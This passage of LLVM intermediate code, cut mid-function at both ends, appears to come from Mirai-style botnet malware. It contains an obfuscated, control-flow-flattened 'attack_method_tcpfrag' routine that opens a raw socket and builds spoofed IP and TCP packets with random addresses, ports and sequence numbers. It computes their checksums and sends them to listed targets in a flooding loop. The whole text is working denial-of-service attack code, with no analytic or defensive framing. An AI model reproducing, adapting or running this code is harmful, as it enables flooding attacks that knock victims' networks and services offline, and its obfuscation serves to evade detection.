  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 790982891, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 1774716386, i32 -1405771242
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -1405771242, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 -1408255016, i32 799299044
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 799299044, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 740646121, i32 917209257
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 917209257, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1746448859, i32 174321538
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 174321538, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 -870797642, i32 953806507
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 953806507, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -849303975, i32 -373260021
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 -373260021, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 1841991243, i32 -390522898
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 -390522898, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 -2142306109, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 -6909772, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 1078236150, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpfrag(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 0)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1142528904, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1142528904, label %first
    i32 912937722, label %99
    i32 26560075, label %100
    i32 1024023711, label %106
    i32 -512458677, label %109
    i32 840930426, label %110
    i32 -145429383, label %116
    i32 -353702494, label %160
    i32 -1161733698, label %164
    i32 957867671, label %289
    i32 -248000217, label %292
    i32 984319061, label %293
    i32 422581646, label %294
    i32 -1019461861, label %300
    i32 -188225175, label %320
    i32 -1475122088, label %341
    i32 156296769, label %345
    i32 1128688051, label %349
    i32 -2061450194, label %354
    i32 -1795473807, label %360
    i32 1147352485, label %365
    i32 -1959344196, label %371
    i32 -132409872, label %376
    i32 614259593, label %382
    i32 -1163611423, label %386
    i32 -1929446578, label %390
    i32 -170761741, label %394
    i32 1828619455, label %398
    i32 1944531407, label %402
    i32 2009215744, label %408
    i32 1183519345, label %446
    i32 -640969973, label %449
    i32 317359496, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 912937722, i32 26560075
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 317359496, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 1024023711, i32 -512458677
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 317359496, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 840930426, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 -145429383, i32 -248000217
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 -353702494, i32 -1161733698
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 -1161733698, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 957867671, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 840930426, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 984319061, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 422581646, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 -1019461861, i32 -640969973
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -188225175, i32 -1475122088
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
